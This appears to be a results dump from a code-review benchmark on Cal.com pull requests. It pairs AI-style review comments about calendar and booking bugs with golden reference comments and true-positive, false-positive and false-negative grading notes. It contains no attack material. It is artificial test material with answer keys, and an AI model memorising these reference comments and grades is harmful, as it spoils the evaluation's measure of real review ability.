`selectedCalendar` is now `calEventRaw.destinationCalendar?.find(cal => cal.credentialId === credentialId)?.externalId` and can legitimately be `undefined`; the insert call compensates with `selectedCalendar || "primary"`, but the follow-up `calendar.events.patch({ calendarId: selectedCalendar, ... })` that writes the hangout link into the description uses the raw value. When no destination calendar matches the credential, this patch request is made with `calendarId: undefined` and fails, so Google Meet links are missing from the event description.

createEvent now ignores destination calendars without a credentialId

The calendar to write to is selected with `calEventRaw.destinationCalendar?.find((cal) => cal.credentialId === credentialId)`. Destination calendar rows whose `credentialId` is null (legacy rows, and the branch in `EventManager.createAllCalendarEvents` that calls `createEvent(c, event)` for destinations without a credentialId) will not match, so `calendarId` silently defaults to `"primary"`. Previously the first destination calendar's `externalId` was used. Users with a non-primary destination calendar and a credential-less destination row will get their bookings written into the wrong calendar, and the booking reference stores no `externalCalendarId` (nothing is passed to `createEvent`), breaking later updates/deletes.

Collective host destination calendars dropped when evt.destinationCalendar is null

`destinationCalendar` is now built as `eventType.destinationCalendar ? [...] : organizerUser.destinationCalendar ? [...] : null`, and the collective hosts are appended with `evt.destinationCalendar?.push(...teamDestinationCalendars)`. When neither the event type nor the organizer has a destination calendar the value is `null`, the optional-chained `push` is a no-op, and all co-hosts' destination calendars are silently discarded – exactly the multi-host case this PR is meant to fix. Initialize the array (e.g. `[]`) and assign/concat instead of relying on `?.push`.

loadUsers for dynamic bookings no longer selects organization slug

The rewritten `loadUsers()` dropped `organization: { select: { slug: true } }` from the Prisma select used for dynamic (no eventTypeId) bookings, while the host-based branch still returns users that carry organization data. Any downstream use of `user.organization` (booker URL / org-domain link building) now gets `undefined` for dynamic group bookings, and the union of the two return shapes also loses the property from the inferred `users` type. Re-add the `organization` selection.

Recurring cancellation duplicates deletes and misses extra calendar references

The recurring-event deletion block now lives inside the new `for (const reference of bookingCalendarReference)` loop. For a booking with N calendar references (the multi-host case this PR introduces) the same "delete all credentials × all updated bookings" work is executed N times, issuing N duplicate delete requests per event. At the same time the inner lookup is still `updBooking.references.find((ref) => ref.type.includes("_calendar"))`, i.e. only the first calendar reference of each recurring booking is ever deleted, so the second host's calendar events are left behind. The loop should be entered once and should iterate over all calendar references of each updated booking.

updateAllCalendarEvents error message is built but never logged

The catch block still composes the diagnostic `message` (including credential type, userId and bookingId) but the `console.error(message)` call was removed, so calendar update failures now return the generic failure results with no trace in the logs. Either log it again or drop the dead string construction.

No tests for multi destination calendar creation/update paths

This PR changes the core contract (`CalendarEvent.destinationCalendar` becomes an array) and rewrites `createAllCalendarEvents`/`updateAllCalendarEvents` to loop over several destinations and to look credentials up from the DB, plus it changes how `referencesToCreate` is derived. No unit test covers: (a) several destination calendars producing one reference each with the right `externalCalendarId`/`credentialId`, (b) an empty/null `destinationCalendar`, (c) a destination whose credential is not owned by the organizer. Given the regressions these paths feed (cancellation/reschedule rely on the stored references), at least handler-level tests for the collective case should accompany the change.

false_negatives.golden_comment: The optional chaining on mainHostDestinationCalendar?.integration is redundant since you already check mainHostDestinationCalendar in the ternary condition.

The `credential` may be undefined when passed to `updateEvent` if `reference.credentialId` is set but the credential is not found. This can lead to a runtime error when `updateEvent` is called with an undefined credential, which should be handled to prevent crashes.

true_positives.golden_comment: Consider adding try-catch around the await to handle import failures gracefully
true_positives.matched_candidate:
Rejected app-module imports become unhandled rejections at module load

All 28 `import()` promises are created when the module is evaluated, but most are never awaited (only the one app matching a credential/dirName is). If any app module throws while being evaluated (missing env var, bad top-level code, transitive import error), its promise rejects with no handler attached. In Node >= 15 an unhandled rejection terminates the process by default, so a single broken app module can take down the whole web/API server, and the failure is reported at module-init time with no connection to the call site that would have needed that app. Previously a failing app module produced a synchronous error on import of `@calcom/app-store`, which was at least attributable and contained.
true_positives.reasoning: Both comments concern import failures not being handled gracefully. The golden suggests a try-catch around the awaited import; the candidate identifies the same class of problem more specifically — eagerly created import() promises that reject with no handler, causing unhandled rejections. The underlying concern (graceful handling of failing app-module imports) aligns, though the candidate's diagnosis is broader than a single try-catch.

true_positives.golden_comment: The code uses forEach with async callbacks, which causes asynchronous operations (e.g., calendar/video event deletions, payment refunds) to run concurrently without being awaited. This 'fire-and-forget' behavior leads to unhandled promise rejections, race conditions, and incomplete cleanup, as surrounding try-catch blocks cannot properly handle errors from these unawaited promises. Replace forEach with for...of loops or Promise.all() with map() to ensure proper sequential execution and error handling.
true_positives.matched_candidate:
try/catch around the cancellation loop is dead code after converting the callback to async

Same defect as in `vital/lib/reschedule.ts`: `forEach(async (bookingRef) => { const calendar = await getCalendar(...); … })` discards the callback promises, so the surrounding `try/catch` that logs errors can never fire, failures from `getCalendar`/`deleteEvent`/`deleteMeeting` become unhandled rejections, and the function proceeds to send the reschedule email and return `true` before the external calendar/video entries have actually been deleted. Await the work explicitly (e.g. `await Promise.all(bookingRefsFiltered.map(async (ref) => …))`) inside the try block.
true_positives.reasoning: The candidate identifies the same defect: an async callback passed to forEach is not awaited, so the surrounding try/catch cannot handle failures and cleanup proceeds prematurely. It also recommends the same corrective approach of awaiting mapped promises.

false_positives.candidate:
Dynamic imports are evaluated eagerly, so nothing is actually loaded lazily

The object literal calls `import("./applecalendar")`, `import("./caldavcalendar")`, … directly as property values. `import()` is invoked at module-evaluation time, so the moment anything imports `@calcom/app-store` all 28 app modules are requested and evaluated — exactly as before, only now asynchronously. The server/serverless bundle still contains every app and cold start still pays for loading all of them, so the PR's stated goal (async/lazy import of app packages) is not achieved while every call site has been forced to become `async`. To get real laziness the values need to be thunks (e.g. `applecalendar: () => import("./applecalendar")`) resolved on demand, ideally with memoization.

getCalendarCredentials creates floating promises and changes the type of `calendar`

`getCalendar(credential)` is now async, but it is still invoked unconditionally inside the `flatMap` before the `app.variant === "calendar"` check. For every non-`calendar` variant credential the returned promise is created and immediately discarded; if it rejects (e.g. the app module fails to load) it becomes an unhandled rejection, which can crash the Node process. In addition, the `calendar` property of the returned items is now `Promise<Calendar | null>` instead of `Calendar | null`; this is a silent contract change for any consumer of `getCalendarCredentials()` other than `getConnectedCalendars` (which was updated), and such a consumer would call methods on a Promise at runtime. Move the `getCalendar` call behind the variant check and audit/convert all consumers.

requestReschedule: calendar/video cancellation is now an un-awaited async forEach

`bookingRefsFiltered.forEach(async (bookingRef) => { const calendar = await getCalendar(...); return calendar?.deleteEvent(...) … })` discards every callback promise. The mutation continues to send the reschedule-request email and webhooks and returns while the `getCalendar` import and the `deleteEvent`/`deleteMeeting` calls are still pending, so in a serverless environment the previous calendar entries and video meetings may never be deleted. Any error thrown inside the callback is now an unhandled rejection (it can terminate the process) rather than something the caller can observe. Use `await Promise.all(bookingRefsFiltered.map(async (ref) => …))` instead.

Commented template entry points at a non-existent path

The commented-out example was changed from `./_example` to `// example: import("./example")`. The app template directory is `_example`, so a developer copying this line as a guide for registering a new app will reference a path that does not exist. Keep the directory name accurate (`import("./_example")`).
